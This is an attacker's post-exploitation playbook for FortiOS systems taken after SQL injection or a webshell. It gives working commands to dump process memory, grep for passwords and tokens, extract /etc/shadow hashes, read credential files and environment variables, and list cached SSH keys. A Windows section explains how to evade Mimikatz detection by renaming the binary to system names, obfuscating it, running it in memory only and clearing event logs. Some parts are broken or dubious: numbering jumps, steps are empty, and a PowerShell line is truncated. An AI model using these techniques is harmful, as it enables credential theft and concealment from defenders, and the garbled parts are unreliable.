================================================================================

Note: MIMIKATZ is Windows-only tool. For Linux FortiOS systems, we use Linux
equivalents to extract credentials, memory dumps, and authentication materials.

1.1 CREDENTIAL EXTRACTION FROM MEMORY (Linux Equivalent to MIMIKATZ)

After Achieving RCE on FortiOS via SQL injection/webshell:

  Step 1: Identify Running Processes
    Command: ps aux | grep -E "apache|nginx|fortinet|admin"
    Result: Find processes that may hold credentials

  Step 2: Dump Process Memory
    Tool: gcore (GNU core dumper)

    Installation (if not available):
      apt-get install gdb

    Usage:
      gcore -o /tmp/fortios_process <PID>

    Result: Creates core dump of process memory

  Step 3: Extract Credentials from Memory Dump
    Tool: strings (extract readable text)

    Command:
      strings /tmp/fortios_process.<PID> | grep -i "password\|credential\|token\|auth"

    Result: Plaintext credentials visible in memory

  Step 4: Advanced Memory Analysis
    Tool: volatility (memory forensics)

    Usage:
      volatility -f /tmp/fortios_process.<PID> --profile=Linux imageinfo
      volatility -f /tmp/fortios_process.<PID> --profile=Linux linux_psaux
      volatility -f /tmp/fortios_process.<PID> --profile=Linux linux_bash

    Result: Extract bash history, environment variables with credentials

1.2 CREDENTIAL EXTRACTION FROM FILES (Equivalent to MIMIKATZ's credential cache)

Locations to Extract:

  Configuration Files:
    /opt/fortinet/config              # Main config (may contain passwords)
    /opt/fortinet/etc/sysctl.conf     # System configuration
    /etc/fortios/admin.conf           # Admin account config

    Command: cat /opt/fortinet/config | grep -i "password\|secret\|key\|token"

  Authentication Database:
    /opt/fortinet/db/admin.db         # Admin database

  API Credentials:
    /opt/fortinet/config | grep -i "api_key\|token\|secret"
    /opt/fortinet/etc/api.conf

    Command: grep -r "api" /opt/fortinet/config

  System Certificates:
    /opt/fortinet/certs/               # SSL certificates
    /opt/fortinet/certs/fortios.pem   # Server certificate

    Command: openssl x509 -in /opt/fortinet/certs/fortios.pem -text -noout

  Backup Files (may be encrypted but key accessible):
    /var/backup/fortios_*.tar.gz
    /opt/fortinet/backup/

    Command: tar -tzf /var/backup/fortios_latest.tar.gz | grep -i password

1.3 LINUX MIMIKATZ EQUIVALENT: DUMPING AUTHENTICATION MATERIAL

Tool 1: /etc/shadow Extraction (equivalent to MIMIKATZ's LSA secrets)

  Command: cat /etc/shadow
  Result: All user password hashes

  Format: username:$6$rounds=656000$salt$hash:last_change:min:max:warning:inactive:expire:reserved

  Extract all hashes:
    awk -F: '{print $1":"$2}' /etc/shadow > /tmp/hashes.txt

Tool 2: Credential Cache Files

  PAM (Pluggable Authentication Modules) cache:
    /var/cache/pam/

  LDAP cache (if used):
    /var/lib/sss/cache/

  SSH agent cache:
    ls -la ~/.ssh/
    ssh-add -l (list cached keys)

Tool 3: Environment Variables (often contain credentials)

  Command: env | grep -iE "password|token|api|secret|key"
  Result: Example outputs:
    FORTINET_ADMIN_PASS=AdminPassword123
    FORTINET_API_KEY=abc123def456
    DATABASE_PASSWORD=dbpass123

Tool 4: Process Environment Inspection

  Command: strings /proc/<PID>/environ | tr '\0' '\n' | grep -i password
  Result: Extract environment variables from running processes

1.4 SESSION HIJACKING (MIMIKATZ's session stealing equivalent)

For Logged-In Users:

  Step 1: Identify Active Sessions
    Command: who
    Result: Shows logged-in users and TTY sessions

  Step 2: Check SSH Keys in Memory

    Result: List cached SSH keys

  Step 3: Use Cached SSH Keys

    (Similar to MIMIKATZ's process injection)

5.1 AVOIDING MIMIKATZ DETECTION

Windows Defender Detection:

  MIMIKATZ is detected by Windows Defender (flagged as trojan)

  Evasion Techniques:

  1. Rename executable
     mimikatz.exe → svchost.exe, lsass.exe, notepad.exe

  2. Obfuscate MIMIKATZ
     Tool: Invoke-Obfuscation PowerShell module
     Result: PowerShell-based MIMIKATZ execution

  3. Use Legitimate Tools
     SEMAssistant.exe (part of Windows Support Tools)
     Can dump credentials similar to MIMIKATZ

  4. Load in Memory Only
     PowerShell -NoExit -C "@("
     (Download from memory, never write to disk)

  5. Use Alternative Tools
     Credential Dumper: SafetyKatz (MIMIKATZ functionality in C#)
     Procdump + Mimidump (alternative extraction method)

5.2 DETECTION INDICATORS

What defenders see (and what to avoid):

  Process Creation:
    Don't create new PowerShell child process
    Use existing processes or WMI

  Network Traffic:
    Avoid unusual outbound connections
    Use existing channels (HTTPS, DNS)

  Registry Modifications:
    Avoid changing security-related registry values
    Use pre-existing configurations

  File System:
    Don't write MIMIKATZ.exe to disk
    Use in-memory execution only

  Event Logs:
    Clear event logs after execution
    Windows logs: Security, System, PowerShell
